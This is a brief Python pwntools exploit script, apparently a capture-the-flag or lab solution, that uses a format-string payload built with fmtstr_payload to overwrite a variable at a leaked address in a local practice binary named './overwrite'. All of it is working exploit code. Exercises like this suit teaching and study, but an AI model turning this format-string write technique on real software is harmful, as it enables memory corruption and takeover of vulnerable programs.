from pwn import *
p = process("./overwrite")
info = p.recvuntil("\n",drop=True)
c_addr = int(info,16)
payload = fmtstr_payload(6,{c_addr:16})
p.sendline(payload)
info = p.recv()
if "modified c." in info:
	print "success"
